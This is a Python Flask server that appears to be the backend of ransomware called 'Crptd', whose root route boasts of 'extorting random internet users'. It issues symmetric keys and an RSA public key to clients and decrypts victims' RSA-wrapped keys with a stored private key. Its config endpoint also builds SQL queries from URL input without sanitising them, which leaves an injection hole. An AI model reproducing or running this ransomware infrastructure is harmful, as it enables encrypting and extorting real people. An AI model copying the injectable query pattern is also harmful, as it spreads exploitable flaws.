from flask import Flask, request
from flask_restful import Resource, Api, reqparse
from sqlalchemy import create_engine
from json import dumps
from flask.ext.jsonpify import jsonify
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import base64

db = create_engine('sqlite:///testconfigDB')
app = Flask(__name__)
api = Api(app)
parser = reqparse.RequestParser()
parser.add_argument('Key')
parser.add_argument('IV')

class config(Resource):
	def get(self, table_name):
		conn = db.connect() #connect to database
		query = conn.execute("select * from %s" %str(table_name)) #query db for all elementss in table_name
		return {table_name: [elem[0] for elem in query.cursor.fetchall()]} #grab first column for all elems in result of query
		
class keys(Resource):#not used by final version of Crptd client
	def get(self, key_type):
		if str(key_type).lower() == 'key':
			b64binK = base64.b64encode(os.urandom(32))
			b64strK = b64binK.decode('utf-8')
			b64binIV = base64.b64encode(os.urandom(16))
			b64strIV = b64binIV.decode('utf-8')
			return {'Key': b64strK, 'IV':b64strIV}
		if str(key_type).lower() == 'publickey':
			with open('RSAPublicKey.bin', 'r') as open_file:
				PubK = open_file.read()
			return {'Key':PubK}

class decryptKey(Resource):
    def post(self):
        args = parser.parse_args()	
        encryptedKey = {'Key':base64.b64decode(args['Key']), 'IV':base64.b64decode(args['IV'])}
        with open('RSAPrivateKey.bin', 'rb') as open_file:
            encodedPrivateKey = open_file.read()
        RSAPrivateKey = RSA.import_key(encodedPrivateKey)
        cipher_RSA = PKCS1_OAEP.new(RSAPrivateKey)
        decryptedKey = {'Key':cipher_RSA.decrypt(encryptedKey['Key']),'IV':cipher_RSA.decrypt(encryptedKey['IV'])}
        b64_decryptedKey = {'Key':base64.b64encode(decryptedKey['Key']), 'IV':base64.b64encode(decryptedKey['IV'])}
        utf8_b64_decryptedKey = {'Key':b64_decryptedKey['Key'].decode('utf-8'),'IV':b64_decryptedKey['IV'].decode('utf-8')}
        return {'Key':utf8_b64_decryptedKey['Key'], 'IV':utf8_b64_decryptedKey['IV']}	

class hello(Resource):
	def get(self):
		return {'CRPTD': 'Extorting random internet users since 2018.(0)'}

api.add_resource(hello, '/')
api.add_resource(config, '/config/<table_name>')
api.add_resource(keys, '/<key_type>')
api.add_resource(decryptKey, '/decryptKey')		
		
if __name__ == '__main__':	
	app.run(port=5002)